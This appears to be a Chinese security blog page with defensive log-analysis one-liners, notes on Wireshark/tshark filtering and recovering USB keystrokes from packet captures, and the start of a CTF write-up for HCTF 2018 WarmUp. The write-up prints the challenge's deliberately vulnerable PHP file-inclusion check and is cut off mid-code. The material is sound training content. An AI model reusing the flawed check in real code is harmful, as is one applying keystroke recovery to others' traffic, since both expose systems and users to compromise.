class="string">&quot;.0&quot;</span>&#125;&#x27; | <span class="keyword">sort</span> | uniq -c | <span class="keyword">sort</span> -r -<span class="keyword">n</span> | head -<span class="keyword">n</span> 200</span><br><span class="line"></span><br><span class="line">统计域名：</span><br><span class="line"><span class="keyword">cat</span>  /www/logs/access.2019-02-23.<span class="keyword">log</span> |awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$2&#125;</span>&#x27;|<span class="keyword">sort</span>|uniq -c|<span class="keyword">sort</span> -rn|<span class="keyword">more</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">对某天访问的 IP 统计：</span><br><span class="line">grep &#x27;23/May/2019&#x27; /www/logs/access.2019-02-23.<span class="keyword">log</span> | awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$1&#125;</span>&#x27; | awk -F&#x27;.&#x27; &#x27;&#123;<span class="keyword">print</span> <span class="variable">$1</span><span class="string">&quot;.&quot;</span><span class="variable">$2</span><span class="string">&quot;.&quot;</span><span class="variable">$3</span><span class="string">&quot;.&quot;</span><span class="variable">$4&#125;</span>&#x27; | <span class="keyword">sort</span> | uniq -c | <span class="keyword">sort</span> -r -<span class="keyword">n</span> | head -<span class="keyword">n</span> 10</span><br><span class="line"></span><br><span class="line">HTTP Status：</span><br><span class="line"><span class="keyword">cat</span>  /www/logs/access.2019-02-23.<span class="keyword">log</span> |awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$9&#125;</span>&#x27;|<span class="keyword">sort</span>|uniq -c|<span class="keyword">sort</span> -rn|<span class="keyword">more</span></span><br><span class="line"></span><br><span class="line">URL 统计：</span><br><span class="line"><span class="keyword">cat</span>  /www/logs/access.2019-02-23.<span class="keyword">log</span> |awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$7&#125;</span>&#x27;|<span class="keyword">sort</span>|uniq -c|<span class="keyword">sort</span> -rn|<span class="keyword">more</span></span><br><span class="line"></span><br><span class="line">文件流量统计：</span><br><span class="line"><span class="keyword">cat</span> /www/logs/access.2019-02-23.<span class="keyword">log</span> |awk &#x27;&#123;<span class="keyword">sum</span>[<span class="variable">$7</span>]+=<span class="variable">$10&#125;</span>END&#123;<span class="keyword">for</span>(i <span class="keyword">in</span> <span class="keyword">sum</span>)&#123;<span class="keyword">print</span> <span class="keyword">sum</span>[i],i&#125;&#125;&#x27;|<span class="keyword">sort</span> -rn|<span class="keyword">more</span></span><br><span class="line"></span><br><span class="line">grep &#x27; 200 &#x27; /www/logs/access.2019-02-23.<span class="keyword">log</span> |awk &#x27;&#123;<span class="keyword">sum</span>[<span class="variable">$7</span>]+=<span class="variable">$10&#125;</span>END&#123;<span class="keyword">for</span>(i <span class="keyword">in</span> <span class="keyword">sum</span>)&#123;<span class="keyword">print</span> <span class="keyword">sum</span>[i],i&#125;&#125;&#x27;|<span class="keyword">sort</span> -rn|<span class="keyword">more</span></span><br><span class="line"></span><br><span class="line">URL访问量统计：</span><br><span class="line"><span class="keyword">cat</span> /www/logs/access.2019-02-23.<span class="keyword">log</span> | awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$7&#125;</span>&#x27; | egrep &#x27;\?|&amp;&#x27; | <span class="keyword">sort</span> | uniq -c | <span class="keyword">sort</span> -rn | <span class="keyword">more</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">脚本运行速度：</span><br><span class="line"></span><br><span class="line">查出运行速度最慢的脚本</span><br><span class="line"></span><br><span class="line">grep -v 0$ /www/logs/access.2019-02-23.<span class="keyword">log</span> | awk -F &#x27;\<span class="string">&quot; &#x27; &#x27;&#123;print $4&quot;</span> <span class="string">&quot; $1&#125;&#x27; web.log | awk &#x27;&#123;print $1&quot;</span> &quot;<span class="variable">$8&#125;</span>&#x27; | <span class="keyword">sort</span> -<span class="keyword">n</span> -k 1 -r | uniq &gt; /tmp/slow_url.txt</span><br><span class="line"></span><br><span class="line">IP, URL 抽取：</span><br><span class="line"></span><br><span class="line"># tail -f /www/logs/access.2019-02-23.<span class="keyword">log</span> | grep &#x27;/<span class="keyword">test</span>.html&#x27; | awk &#x27;&#123;<span class="keyword">print</span> <span class="variable">$1</span><span class="string">&quot; &quot;</span><span class="variable">$7&#125;</span>&#x27;</span><br></pre></td></tr></table></figure>





<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p><strong>数据包隐写术</strong> </p>
<p>数据包隐写术，就是将所要传达的信息和文件，以流量包的形式下发给参赛选手，参赛选手要从流量包中自行提取出所需要的文件或者相关内容进行解题。</p>
<p>数据包隐写术目前两种考察行为: </p>
<p>1、flag或者关键信息直接隐藏在流量包中 </p>
<p>2、flag相关文件隐藏在流量包中，需要分离文件</p>
<p>相关工具或者命令: Wireshark、binwalk、strings、foremost</p>
<hr>
<p><strong>USB协议分析</strong></p>
<p><a target="_blank" rel="noopener" href="http://www.usb.org/developers/hidpage/Hut1_12v2.pdf">http://www.usb.org/developers/hidpage/Hut1_12v2.pdf</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801214148349.png" alt="image-20220801214148349"></p>
<p>每一个数据包的数据区有四个字节，第一个字节代表按键，当取0x00时，代表没有按键、为0x01时，代表按左键，为0x02时，代表当前按键为右键。第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。第三个字节与第二字节类似，代表垂直上下移动的偏移。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/WangYihang/UsbMiceDataHacker">https://github.com/WangYihang/UsbMiceDataHacker</a></p>
<hr>
<p><strong>键盘协议</strong></p>
<p>键盘数据包的数据长度为8个字节，击键信息集中在第3个字节根据data值与具体键位的对应关系可从数据包恢复出键盘的案件信息</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801214239988.png" alt="image-20220801214239988"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801214257421.png" alt="image-20220801214257421"></p>
<p><a target="_blank" rel="noopener" href="https://github.com/WangYihang/UsbKeyboardDataHacker">https://github.com/WangYihang/UsbKeyboardDataHacker</a></p>
<p>使用tshark命令行工具，可以将 leftover capture data单独提取出来</p>
<p><code>tshark -r usb1.pcap -T fields -e usb.capdata &gt; usbdata.txt</code></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801214338418.png" alt="image-20220801214338418"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801214352911.png" alt="image-20220801214352911"></p>
<hr>
<p><strong>Wireshark—过滤语法</strong></p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">语法：Protocol.String <span class="number">1</span>.String <span class="number">2</span> Comparison operator ValueLogical OperationsOther expression</span><br><span class="line"></span><br><span class="line">例子：http.request.method ==<span class="string">&quot;GET”</span></span><br><span class="line">Protocol（协议）ether，fddi， ip，arp，rarp，decnet，lat， sca，moprc，mopdl， tcp ， udp 等，如果没指明协议类型，则默认为捕捉所有支持的协议。</span><br><span class="line"></span><br><span class="line">string1和string2是可选的</span><br><span class="line"></span><br><span class="line">比较运算符</span><br><span class="line"></span><br><span class="line">==	<span class="meta">#等于		 ip.src==10.0.0.5</span></span><br><span class="line">!= 	<span class="meta">#不等于	 ip.src!=10.0.0.5</span></span><br><span class="line">&gt; 	<span class="meta">#大于     	 frame.len &gt; 10</span></span><br><span class="line">&lt; 	<span class="meta">#小于		 frame.len &lt; 128</span></span><br><span class="line">&gt;= 	<span class="meta">#大于等于  frame.len &gt;= 0x100</span></span><br><span class="line">&lt;= 	<span class="meta">#小于等于  frame.len &lt;= 0x20</span></span><br><span class="line">、</span><br><span class="line"></span><br><span class="line">ip.addr == <span class="number">192.168</span>.<span class="number">5.231</span>	<span class="meta">#显示来自192.168.5.231 的流量包</span></span><br><span class="line">ip.src != <span class="number">192.168</span>.<span class="number">5.231</span> or ip.dst != <span class="number">192.168</span>.<span class="number">5.231</span>  <span class="meta">#显示来自除192.168.5.231 之外i的流量包</span></span><br><span class="line">ip.src == <span class="number">192.168</span>.<span class="number">5.0</span>/<span class="number">24</span> 显示来自<span class="number">192.168</span>.<span class="number">5</span>.网段的封包 </span><br><span class="line">tcp.port == <span class="number">25</span> 显示来源或目的TCP端口号为<span class="number">25</span>的封包。</span><br><span class="line">tcp.dstport == <span class="number">25</span> 显示目的TCP端口号为<span class="number">25</span>的封包。</span><br><span class="line">http.request.method== <span class="string">&quot;POST&quot;</span> 显示post请求方式的http封包。</span><br><span class="line">http.host == <span class="string">&quot;tracker.1ting.com&quot;</span> 显示请求的域名为tracker.<span class="number">1</span>ting.com的http封包。</span><br><span class="line">tcp.flags.syn == <span class="number">0</span>x02 显示包含TCP SYN标志的封包。</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>内容过滤语法</strong></p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">深度字符串匹配</span><br><span class="line"></span><br><span class="line"><span class="keyword">contains</span> ：协议，字段或切片是否包含值</span><br><span class="line"></span><br><span class="line">示例</span><br><span class="line"></span><br><span class="line">tcp <span class="keyword">contains</span> <span class="string">&quot;http&quot;</span> 显示payload中包含<span class="string">&quot;http&quot;</span>字符串的tcp封包。</span><br><span class="line"><span class="keyword">http</span>.request.uri <span class="keyword">contains</span> <span class="string">&quot;online&quot;</span> 显示请求的uri包含<span class="string">&quot;online&quot;</span>的<span class="keyword">http</span>封包。</span><br><span class="line"></span><br><span class="line">过滤中函数的使用（<span class="built_in">upper</span>、<span class="built_in">lower</span>）</span><br><span class="line">示例：<span class="built_in">upper</span>(<span class="keyword">http</span>.request.uri) <span class="keyword">contains</span> <span class="string">&quot;ONLINE&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801214606430.png" alt="image-20220801214606430"></p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">http显示过滤</span><br><span class="line">1.1 http方法</span><br><span class="line">http.ssl_port    #https方法发送请求数据</span><br><span class="line">http.request.method == “GET” #通过GET方法请求数据</span><br><span class="line">http.request.method == “POST” #通过POST方法请求数据</span><br><span class="line">http.request.full_uri contains &quot;png&quot;    #通过请求中包含” png &quot;名字的url</span><br><span class="line">http contains “GET” #通过请求中包含GET</span><br><span class="line">http contains “HTTP/1.” #通过请求中包含“HTTP/1.”</span><br><span class="line">1.2 http 显示请求</span><br><span class="line">1 GET包</span><br><span class="line">http.request.method == “GET” &amp;&amp; http contains “Host: ”</span><br><span class="line">http.request.method == “GET” &amp;&amp; http contains “User-Agent: ”</span><br><span class="line">2 POST包</span><br><span class="line">http.request.method == “POST” &amp;&amp; http contains “Host: ”</span><br><span class="line">http.request.method == “POST” &amp;&amp; http contains “User-Agent: ”</span><br><span class="line">3 响应包</span><br><span class="line">http contains “HTTP/1.1 200 OK” &amp;&amp; http contains “Content-Type: ”</span><br><span class="line">http contains “HTTP/1.0 200 OK” &amp;&amp; http contains “Content-Type: ”</span><br><span class="line"></span><br><span class="line">2 端口过滤</span><br><span class="line">2.1 仅显示80端口的流量</span><br><span class="line">tcp.port==80 || udp.port==80     #显示tcp端口为80的流量（包括tcp和udp)</span><br><span class="line">tcp.port &gt;= 1 and tcp.port &lt;= 80    #显示tcp端口在1-80之间的流量</span><br><span class="line">tcp.dstport == 8080    #只显tcp协议的目标端口8080</span><br><span class="line">tcp.srcport == 8080    #只显tcp协议的源端口8080</span><br><span class="line">2.2 FTP/telnet默认的端口</span><br><span class="line">tcp.port == 23</span><br><span class="line">tcp.port&gt;=20 and tcp.port&lt;=30</span><br><span class="line">2.3 常见的web应用端口</span><br><span class="line"></span><br><span class="line">tcp.port=7001        #WebLogic，默认的端口号为7001</span><br><span class="line">tcp.port=9080 #WebSphere应用程序，默认的端口号为9080</span><br><span class="line">tcp.port=9090 #WebSphere管理工具，默认的端口号为9090</span><br><span class="line">tcp.port=8080        #JBOSS，默认的端口号为8080</span><br><span class="line">tcp.port-8080 #TOMCAT，默认的端口号为8080</span><br><span class="line"></span><br><span class="line">3 主机过滤</span><br><span class="line">ip.addr == 10.202.188.188           # 仅显示10.202.188.188的流量</span><br><span class="line"></span><br><span class="line">ip.src ==10.202.188.188              #仅显示目的为10.202.188.188的流量</span><br><span class="line"></span><br><span class="line">ip.dst ==10.202.188.188              #仅显示来源为10.202.188.188的流量</span><br><span class="line"></span><br><span class="line">ip.addr !=10.202.188.188             #显示除10.202.188.188外的流量</span><br><span class="line"></span><br><span class="line">4 协议过滤</span><br><span class="line">4.1 arp 协议流量</span><br><span class="line"></span><br><span class="line"> arp     #显示接口中所有的arp协议</span><br><span class="line"></span><br><span class="line">ip.addr =10.202.188.188 and arp #仅显示主机10.202.188.188的arp请求。</span><br><span class="line"></span><br><span class="line">arp.src.proto_ipv4 #显示源协议为IPv4的地址请求。</span><br><span class="line"></span><br><span class="line">类似正则表达式</span><br><span class="line"><span class="symbol">\d</span>          0-9的数字</span><br><span class="line"><span class="symbol">\D</span>          <span class="symbol">\d</span>的补集（以所以字符为全集，下同），即所有非数字的字符</span><br><span class="line"><span class="symbol">\w</span>          单词字符，指大小写字母、0-9的数字、下划线</span><br><span class="line"><span class="symbol">\W</span>          <span class="symbol">\w</span>的补集</span><br><span class="line"><span class="symbol">\s</span>          空白字符，包括换行符<span class="symbol">\n</span>、回车符<span class="symbol">\r</span>、制表符<span class="symbol">\t</span>、垂直制表符<span class="symbol">\v</span>、换页符<span class="symbol">\f</span></span><br><span class="line"><span class="symbol">\S</span>          <span class="symbol">\s</span>的补集</span><br><span class="line">.          除换行符<span class="symbol">\n</span>外的任意字符。 在Perl中，“.”可以匹配新行符的模式被称作“单行模式”</span><br><span class="line">.*       匹配任意文本，不包括回车(<span class="symbol">\n</span>)? 。 而，[0x00-0xff]*        匹配任意文本,包括<span class="symbol">\n</span></span><br><span class="line">[…]          匹配[]内所列出的所有字符</span><br><span class="line">[^…]          匹配非[]内所列出的字符</span><br><span class="line">定位字符</span><br><span class="line">^          表示其后的字符必须位于字符串的开始处</span><br><span class="line">$          表示其前面的字符必须位于字符串的结束处</span><br><span class="line">重复</span><br><span class="line">&#123;n&#125;          匹配前面的字符n次</span><br><span class="line">&#123;n,&#125;          匹配前面的字符n次或多于n次</span><br><span class="line">&#123;n,m&#125;          匹配前面的字符n到m次</span><br><span class="line">?          匹配前面的字符0或1次</span><br><span class="line">+          匹配前面的字符1次或多于1次</span><br><span class="line">*          匹配前面的字符0次或式于0次</span><br><span class="line"></span><br><span class="line">搜索按条件过滤udp的数据段payload（数字8是表示udp头部有8个字节，数据部分从第9个字节开始udp[8:]）</span><br><span class="line">udp[8]==14        (14是十六进制0x14)匹配payload第一个字节0x14的UDP数据包</span><br><span class="line">udp[8:2]==14:05 可以udp[8:2]==1405，且只支持2个字节连续，三个以上须使用冒号：分隔表示十六进制。 (相当于 udp[8]==14 and udp[9]==05,1405是0x1405)</span><br><span class="line">udp[8:3]==22:00:f7 但是不可以udp[8:3]==2200f7</span><br><span class="line">udp[8:4]==00:04:00:2a，匹配payload的前4个字节0x0004002a</span><br><span class="line">而udp contains 7c:7c:7d:7d 匹配payload中含有0x7c7c7d7d的UDP数据包，不一定是从第一字节匹配。</span><br><span class="line">udp[8:4] matches “<span class="symbol">\\</span>x14<span class="symbol">\\</span>x05<span class="symbol">\\</span>x07<span class="symbol">\\</span>x18″</span><br><span class="line">udp[8:] matches “^<span class="symbol">\\</span>x14<span class="symbol">\\</span>x05<span class="symbol">\\</span>x07<span class="symbol">\\</span>x18<span class="symbol">\\</span>x14″</span><br><span class="line"></span><br><span class="line">搜索按条件过滤tcp的数据段payload（数字20是表示tcp头部有20个字节，数据部分从第21个字节开始tcp[20:]）</span><br><span class="line">tcp[20:] matches “^GET [ -~]*HTTP/1.1<span class="symbol">\\</span>x0d<span class="symbol">\\</span>x0a”</span><br><span class="line">等同http matches “^GET [ -~]*HTTP/1.1<span class="symbol">\\</span>x0d<span class="symbol">\\</span>x0a”</span><br><span class="line">tcp[20:] matches “^GET (.*?)HTTP/1.1<span class="symbol">\\</span>x0d<span class="symbol">\\</span>x0a”</span><br><span class="line">tcp[20:] matches “^GET (.*?)HTTP/1.1<span class="symbol">\\</span>x0d<span class="symbol">\\</span>x0a[<span class="symbol">\\</span>x00-<span class="symbol">\\</span>xff]*Host: (.*?)pplive(.*?)<span class="symbol">\\</span>x0d<span class="symbol">\\</span>x0a”</span><br><span class="line">tcp[20:] matches “^GET (.*?)HTTP/1.1<span class="symbol">\\</span>x0d<span class="symbol">\\</span>x0a[<span class="symbol">\\</span>x00-<span class="symbol">\\</span>xff]*Host: “</span><br><span class="line">tcp[20:] matches “^POST / HTTP/1.1<span class="symbol">\\</span>x0d<span class="symbol">\\</span>x0a[<span class="symbol">\\</span>x00-<span class="symbol">\\</span>xff]*<span class="symbol">\\</span>x0d<span class="symbol">\\</span>x0aConnection: Keep-Alive<span class="symbol">\\</span>x0d<span class="symbol">\\</span>x0a<span class="symbol">\\</span>x0d<span class="symbol">\\</span>x0a”</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>tshark</strong></p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">用Tshark读取文件</span><br><span class="line">如果有要处理的pcap文件，则可以使用“-r”命令。也可以通过“head”（仅显示指定数量的输出行）或“less”（一次显示一整页输出）来输出到屏幕上，例如：tshark -r interesting-packets<span class="number">.</span>pcap | head默认情况下，“head”只会显示前<span class="number">10</span>行，但您可以根据需要对其进行修改，</span><br><span class="line"></span><br><span class="line">使用Tshark过滤流量</span><br><span class="line">当我们在查看一个pcap文件时，通常我们会寻找某些特定特征。例如，我们需要查找与某些<span class="built_in">IP</span>地址或服务相关的所有流量。我们可以使用捕获过滤器。但如果我们使用Wireshark，Wireshark捕获过滤器与tshark的工作方式略有不同。Tshark实际上使用Wireshark Display Filter语法进行捕获和显示。tshark捕获过滤器的语法是：&lt;field&gt;&lt;operator&gt;&lt;value&gt;举个栗子：</span><br><span class="line"><span class="built_in">ip</span><span class="number">.</span>dst==<span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span> </span><br><span class="line"><span class="built_in">ip</span><span class="number">.</span>proto==<span class="number">17</span> </span><br><span class="line">tcp<span class="number">.</span>flags<span class="number">.</span>reset!=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">选择Tshark输出哪些字段</span><br><span class="line">使用命令“-T fields”来标识我们希望指定要查看的确切字段，而不是显示默认信息。然后可以使用“-e”来标识要打印的特定字段。下面一个只打印源和目标<span class="built_in">IP</span>地址的例子：</span><br><span class="line">tshark -r interesting-host<span class="number">.</span>pcap -T fields -e <span class="built_in">ip</span><span class="number">.</span>src -e <span class="built_in">ip</span><span class="number">.</span>dst <span class="built_in">ip</span><span class="number">.</span>dst==<span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span> </span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220801214906900.png" alt="image-20220801214906900"></p>
<h1 id="安全设备见pdf"><a href="#安全设备见pdf" class="headerlink" title="安全设备见pdf"></a>安全设备见pdf</h1>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/13/WeChat%E5%B0%8F%E7%A8%8B%E5%BA%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/05/13/WeChat%E5%B0%8F%E7%A8%8B%E5%BA%8F/" class="post-title-link" itemprop="url">WeChat小程序</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-05-13 12:18:15" itemprop="dateCreated datePublished" datetime="2022-05-13T12:18:15+08:00">2022-05-13</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>0</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>1 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/05/buu/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/05/05/buu/" class="post-title-link" itemprop="url">buu</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-05-05 21:43:37" itemprop="dateCreated datePublished" datetime="2022-05-05T21:43:37+08:00">2022-05-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-05-28 20:45:19" itemprop="dateModified" datetime="2022-05-28T20:45:19+08:00">2022-05-28</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%A4%87%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">备赛</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>65k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>59 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>) </span></span><br><span class="line"><span class="function">        //传入了变量<span class="title">page</span>，也就是我们刚刚传进来的<span class="title">file</span></span></span><br><span class="line"><span class="function">            </span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        	<span class="comment">// 这里定义了白名单,包括source.php和hint.php</span></span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="comment">/*为了返回 true 两个条件必须满足</span></span><br><span class="line"><span class="comment">            	1 page存在 </span></span><br><span class="line"><span class="comment">            	2 page是字符串 ，</span></span><br><span class="line"><span class="comment">            	这里和外层的判断file 一致基本是再次判断了一遍*/</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">  